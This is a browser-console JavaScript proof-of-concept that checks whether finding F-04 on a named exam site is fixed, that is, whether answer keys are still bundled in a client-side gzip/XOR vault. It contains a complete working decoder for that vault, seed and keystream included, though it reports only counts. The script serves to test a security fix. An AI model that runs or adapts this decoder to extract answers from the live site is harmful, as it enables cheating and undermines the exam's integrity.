// poc_f04_exam_answers.js — F-04 FIX verification (DISPLAY-ONLY, read-only)
//
// Target:  https://trithuc500.vercel.app/
// Finding: F-04 — V4.5/V4.8.x shipped answer keys inside the client gzip/XOR vault.
//           V5.4.2/V5.4.3 moved questions and grading server-side.
// Type:     DISPLAY ONLY. Decodes the shipped vault locally and reports COUNTS.
//           No answer values are printed. No state change, no network write.
//
// Usage: paste into DevTools Console on the target page.

(async () => {
    'use strict';

    const EXAM_SEED = 0x4F81E3A7;
    const result = {
        ok: false,
        type: 'DISPLAY',
        finding: 'F-04',
        status: 'UNVERIFIED',
        exams: null,
        answers: 0,
        questions: 0,
        serverExamRecords: 0,
        hasServerFetch: false,
        hasServerSubmit: false,
        verdict: 'not observed'
    };

    async function decodeGzChunks(chunks) {
        if (!Array.isArray(chunks) || !chunks.length) return '[]';
        if (typeof DecompressionStream === 'undefined' || typeof Response === 'undefined' || typeof Blob === 'undefined') {
            throw new Error('DecompressionStream unavailable in this context');
        }
        const parts = [];
        for (let ci = 0; ci < chunks.length; ci++) {
            const bin = atob(chunks[ci]);
            const buf = new Uint8Array(bin.length);
            let s = ((EXAM_SEED ^ Math.imul(ci + 1, 0x9E3779B1)) >>> 0) || 0x9E3779B9;
            const ks = new Uint8Array(4096);
            for (let k = 0; k < 4096; k++) {
                s ^= (s << 13) >>> 0; s ^= (s >>> 17); s ^= (s << 5) >>> 0;
                ks[k] = (s ^ ((k * 31) & 0xFF)) & 0xFF;
            }
            for (let i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i) ^ ks[i & 4095];
            parts.push(buf);
        }
        if (typeof window.__AERO_GUNZIP__ === 'function') {
            return await window.__AERO_GUNZIP__(Buffer.concat ? parts.map(p => Buffer.from(p)) : parts);
        }
        const res = new Response(new Blob(parts).stream().pipeThrough(new DecompressionStream('gzip')));
        return await res.text();
    }

    function countAnswers(e) {
        const ca = e && e.correctAnswers;
        if (!ca || typeof ca !== 'object') return 0;
        return ['p1', 'p2', 'p3', 'p4'].reduce((n, p) => n + Object.keys(ca[p] || {}).length, 0);
    }

    try {
        const scripts = Array.from(document.querySelectorAll('script')).map(s => s.textContent || '');
        const src = scripts.join('\n');
        result.hasServerFetch = src.includes("/api/exams/fetch?id=");
        result.hasServerSubmit = src.includes("fetch('/api/exams/submit'");

        const blobLine = scripts.flatMap(t => t.split('\n')).find(t => t.includes('var __ENC_GZ = '));
        if (blobLine) {
            const from = blobLine.indexOf('var __ENC_GZ = ') + 'var __ENC_GZ = '.length;
            const to = blobLine.indexOf(';', from);
            const enc = JSON.parse(blobLine.slice(from, to));
            const exams = JSON.parse(await decodeGzChunks(enc.exams || []));
            if (Array.isArray(exams)) {
                result.exams = exams.length;
                result.answers = exams.reduce((n, e) => n + countAnswers(e), 0);
                result.questions = exams.reduce((n, e) => n + ((e && Array.isArray(e.questions)) ? e.questions.length : 0), 0);
                result.serverExamRecords = exams.filter(e => e && e._serverExamV533 === true).length;
            }
        }

        result.ok = result.exams !== null;
        const fixed = result.answers === 0 && result.questions === 0 &&
            result.serverExamRecords === result.exams && result.hasServerFetch && result.hasServerSubmit;
        result.status = fixed ? 'FIXED-V5.4.6' : (result.answers > 0 ? 'CONFIRMED' : 'UNVERIFIED');
        result.verdict = fixed
            ? 'F-04 FIXED: answer keys and questions are server-only; grading via /api/exams/submit'
            : (result.answers > 0 ? 'F-04 CONFIRMED: answer keys remain in the bundle' : 'inspect manually');
    } catch (e) {
        result.note = 'Vault decode unavailable in this context: ' + String(e && e.message || e).slice(0, 100);
    }

    console.table({
        finding: result.finding,
        type: result.type,
        status: result.status,
        exams: result.exams,
        bundledAnswers: result.answers,
        bundledQuestions: result.questions,
        serverExamRecords: result.serverExamRecords,
        serverFetch: result.hasServerFetch,
        serverSubmit: result.hasServerSubmit,
        verdict: result.verdict
    });

    return result;
})();
